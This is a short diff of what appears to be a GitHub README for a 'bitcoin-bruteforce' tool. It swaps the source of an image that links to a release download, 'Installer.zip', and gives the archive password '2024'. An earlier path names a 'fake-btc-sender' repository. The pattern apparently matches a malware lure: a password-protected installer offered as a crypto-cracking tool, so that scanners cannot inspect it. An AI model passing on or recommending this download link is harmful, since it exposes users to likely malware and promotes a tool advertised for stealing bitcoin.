@@ -5,7 +5,7 @@
 
 ![image](https://user-images.githubusercontent.com/88630056/192157957-6351b77a-a721-435d-a39a-4ff219a65d61.png)
 
-[![image](https://github.com/vuhuyhoang12abm/fake-btc-sender/blob/main/0UUxzc9.png)](https://github.com/wakanameko/bitcoin-bruteforce/releases/download/bitcoin-bruteforce-tool/Installer.zip)
+[![image](https://github.com/wakanameko/bitcoin-bruteforce/blob/main/0UUxzc9.png)](https://github.com/wakanameko/bitcoin-bruteforce/releases/download/bitcoin-bruteforce-tool/Installer.zip)
 
 # password: 2024
 
